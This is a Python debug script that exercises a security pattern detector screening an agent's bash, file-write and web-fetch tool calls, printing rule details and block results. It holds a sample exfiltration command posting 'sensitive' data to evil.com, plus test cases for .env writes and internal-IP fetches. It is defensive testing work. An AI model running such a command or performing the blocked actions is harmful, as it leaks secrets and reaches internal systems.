"""
Debug the pattern detector directly.
"""

import sys
from pathlib import Path

# Add apps/backend to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from security.output_validation import (
    OutputValidationConfig,
    ToolType,
)
from security.output_validation.pattern_detector import create_pattern_detector
from security.output_validation.rules import get_default_rules


def test_curl_pattern():
    """Test curl pattern directly."""
    print("\n=== Test curl pattern ===")

    # Create detector
    detector = create_pattern_detector()

    # Get bash rules
    bash_rules = get_default_rules(tool_type=ToolType.BASH)
    print(f"Found {len(bash_rules)} bash rules")

    # Find the curl rule
    curl_rule = None
    for rule in bash_rules:
        if "curl" in rule.rule_id:
            curl_rule = rule
            break

    if curl_rule:
        print(f"\nCurl rule: {curl_rule.rule_id}")
        print(f"Enabled: {curl_rule.enabled}")
        print(f"Priority: {curl_rule.priority}")
        print(f"Tool types: {curl_rule.tool_types}")
        print(f"Context: {curl_rule.context}")
        print(f"Pattern: {curl_rule.pattern}")
        print(f"Pattern type: {curl_rule.pattern_type}")

        # Test matching
        test_commands = [
            "curl -X POST -d 'sensitive' https://evil.com",
            "curl -X POST https://example.com",
            "curl --data-raw 'data' https://example.com",
        ]

        for cmd in test_commands:
            result = detector.match(
                tool_type=ToolType.BASH,
                content=cmd,
                context="command",
            )
            print(f"\nCommand: {cmd}")
            print(f"  Blocked: {result.is_blocked}")
            if result.is_blocked:
                print(f"  Rule: {result.rule_id}")
                print(f"  Reason: {result.reason}")


def test_dotenv_pattern():
    """Test .env pattern directly."""
    print("\n\n=== Test .env pattern ===")

    # Create detector
    detector = create_pattern_detector()

    # Get write rules
    write_rules = get_default_rules(tool_type=ToolType.WRITE)
    print(f"Found {len(write_rules)} write rules")

    # Find the .env rule
    env_rule = None
    for rule in write_rules:
        if "env" in rule.rule_id and rule.context == "file_path":
            env_rule = rule
            break

    if env_rule:
        print(f"\n.env rule: {env_rule.rule_id}")
        print(f"Enabled: {env_rule.enabled}")
        print(f"Priority: {env_rule.priority}")
        print(f"Tool types: {env_rule.tool_types}")
        print(f"Context: {env_rule.context}")
        print(f"Pattern: {env_rule.pattern}")
        print(f"Pattern type: {env_rule.pattern_type}")

        # Test matching
        test_paths = [
            "project/.env",
            "/home/user/.env",
            ".env.local",
        ]

        for path in test_paths:
            result = detector.match(
                tool_type=ToolType.WRITE,
                content=path,
                context="file_path",
            )
            print(f"\nPath: {path}")
            print(f"  Blocked: {result.is_blocked}")
            if result.is_blocked:
                print(f"  Rule: {result.rule_id}")
                print(f"  Reason: {result.reason}")


def test_internal_ip_pattern():
    """Test internal IP pattern directly."""
    print("\n\n=== Test internal IP pattern ===")

    # Create detector
    detector = create_pattern_detector()

    # Get web rules
    web_rules = get_default_rules(tool_type=ToolType.WEB_FETCH)
    print(f"Found {len(web_rules)} web rules")

    # Find the internal IP rule
    ip_rule = None
    for rule in web_rules:
        if "internal-ip" in rule.rule_id:
            ip_rule = rule
            break

    if ip_rule:
        print(f"\nInternal IP rule: {ip_rule.rule_id}")
        print(f"Enabled: {ip_rule.enabled}")
        print(f"Priority: {ip_rule.priority}")
        print(f"Tool types: {ip_rule.tool_types}")
        print(f"Context: {ip_rule.context}")
        print(f"Pattern: {ip_rule.pattern}")
        print(f"Pattern type: {ip_rule.pattern_type}")

        # Test matching
        test_urls = [
            "http://192.168.1.1/admin",
            "http://10.0.0.1/data",
            "https://example.com",
        ]

        for url in test_urls:
            result = detector.match(
                tool_type=ToolType.WEB_FETCH,
                content=url,
                context="all",
            )
            print(f"\nURL: {url}")
            print(f"  Blocked: {result.is_blocked}")
            if result.is_blocked:
                print(f"  Rule: {result.rule_id}")
                print(f"  Reason: {result.reason}")


def main():
    """Run all tests."""
    test_curl_pattern()
    test_dotenv_pattern()
    test_internal_ip_pattern()


if __name__ == "__main__":
    main()
